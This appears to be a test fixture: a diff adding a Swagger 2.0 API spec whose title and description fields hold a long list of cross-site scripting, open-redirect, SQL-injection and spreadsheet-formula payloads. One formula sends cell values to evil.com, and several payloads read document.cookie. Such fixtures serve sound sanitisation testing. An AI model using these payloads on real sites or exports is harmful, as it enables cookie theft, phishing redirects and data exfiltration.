@@ -1,0 +1,52 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: http://bing.com
+info:
+  version: "1.0.0"
+  title: <img src=x onerror=print(1)>
+  description: <a href=http://bing.com/>Click Me</a>
+  description: <ifrane src=https://bing.com></iframe>
+  description:   &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+  description: &lt;scr&lt;script&gt;ipt&gt;alert(&#39;XSS&#39;)&lt;/scr&lt;script&gt;ipt&gt;
+  description: &quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+  description: &quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+  description: &lt;script&gt;\u0061lert(&#39;22&#39;)&lt;/script&gt;
+  description: &lt;script&gt;eval(&#39;\x61lert(\&#39;33\&#39;)&#39;)&lt;/script&gt;
+  description: &lt;script&gt;eval(8680439..toString(30))(983801..toString(36))&lt;/script&gt; //parseInt(&quot;confirm&quot;,30) == 8680439
+  description: &amp;&amp; 8680439..toString(30) == &quot;confirm&quot;
+  description: &lt;object/data=&quot;jav&amp;#x61;sc&amp;#x72;ipt&amp;#x3a;al&amp;#x65;rt&amp;#x28;23&amp;#x29;&quot;&gt;
+  description: &#39; onmouseover=alert(1);&gt;
+  description: ?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%3Cp%20class
+  description: =%22&amp;p=1
+  description: &quot;&gt;&lt;img src=x onerror=alert(1)&gt;
+  description: “&gt;&lt;img+src=0+onerror=alert(document.cookie);&gt;&lt;! —
+  description: &amp;lt;SCRIPT&amp;gt;alert(877)&amp;lt;/SCRIPT&amp;gt;
+  description: ¼script¾alert(1034)¼/script¾
+  description: &amp;lt;IMG SRC=&amp;quot;javascript:alert(1855)&amp;quot;
+  description: javascript:alert(&quot;hellox worldss&quot;)
+  description: foo\’; alert(document.cookie);//’;
+  description: &lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
+  description: &lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
+  description: \&quot;;alert(&#39;XSS&#39;);//
+  description: admin’--
+  description: &lt;img src=&quot;javascript:alert(1)&quot;&gt;
+  description: &lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
+  description: &lt;svg/onload=alert(1)
+  description: &lt;img src=xss onerror=alert(1)&gt;
+  description: &lt;script&gt;alert(1)&lt;/script&gt;
+  description: &lt;h1&gt;&lt;a/href%3dhttps://evil%25%32%65com&gt;test&lt;/a&gt;&lt;/h1&gt; open redirect
+  description: &lt;h1&gt;&lt;a+href%https://evil.com&gt;click&lt;/a&gt;&lt;/h1&gt;
+  description: &lt;h2&gt; hello &lt;a href=https://evil.com&gt;click link&lt;/a&gt;&lt;/h2&gt;
+  description: “&lt;marquee onstart=alert(1)&gt;poc&lt;/marquee&gt;”
+  description: =HYPERLINK(“http://evil.com?x=&quot;&amp;A3&amp;&quot;,&quot;&amp;B3&amp;&quot;[CR]&quot;,&quot;Error fetching info: Click me to resolve.”)
+  description: =HYPERLINK(&quot;http://evil.com&quot;,&quot;Click&quot;)
+  description: &lt;script&gt;alert(H@cked)&lt;/script&gt;
+  description: “&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
